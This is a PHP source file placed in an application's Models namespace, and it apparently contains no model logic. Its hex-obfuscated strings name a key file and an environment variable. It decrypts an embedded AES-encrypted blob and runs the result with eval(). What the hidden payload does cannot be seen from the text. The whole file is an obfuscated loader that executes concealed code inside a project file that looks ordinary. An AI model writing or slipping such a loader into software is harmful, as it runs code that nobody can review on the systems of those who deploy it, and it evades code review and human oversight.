<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iV3bBIg1Aq5appwzKNffxQ==');

$c=base64_decode(

'PC3oxlSdlEpowGXhfJ1NSP5hClugM9wn3NfQ09pwTx13zZelB6itbd9sZvnOP4H/OUJ2Tovadg48' .
'aOEbgUQm6uazxylAUxsElVYuYPGwZrRdiIpZDnqRJ7c1J0ykkTbGcplODEQSjrkZ/KkBZdvtnsI6' .
'S1JD1MSqCVYhdfQugHgZ5z3/eHIxQsERcLRnvv9C1FPtOCOa3Sximmqa6hRjsumxCJf/y167pnTi' .
'FocKLo3HyDoUcWJ3hqkFlu7b6RF5Gvy8pxa8NO/qfUwPYuMhxpkgak0DBGO7U9boHLTtYXS3uR+D' .
'QJAiYLMFPxmrfxnxxuZhjZO5lzi9a765UBL1OGIP0CGHi1N/Zlyeag3Lhal1PiaiHmQow4nPO5ne' .
'IAbS5t/e18uxkB8zxHwwhD1jXhZa5i9XToMRZz4mxkqj/y8BAn7x3ALhL0ukUzG66yBvPK9XhFdS' .
'xWb+fL0KsB/v2h0Z5uDILPejYwI4md9LGzbjzfPoyPOOPbQi8Ie987Sk+Io9wwxh03+/8a8puNFk' .
'bLnPJYiGuGsTve92YRQWzEySEyN5tDXb1W+6TBk0UGhv0r9zqqyI761ovrsLNDT8KdgzBGLl1Vvx' .
'QDoUJHsz3q4ZzaSfhCmGuMEZ6wcJzIQIQPcgpDrtMu4F6ESGkRuRxcFhldcEsq7xOgI4sRZmPQt+' .
'KT69CyT47hvI7DgBl/E1HlMZydDwc91DnYp1tf6R2MFFYBePhr/cV+amLeUiZ7jlkX+GQx30gKu/' .
'F6ZgYi/k4JggDZDW+EUjB+xHB6rJNw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

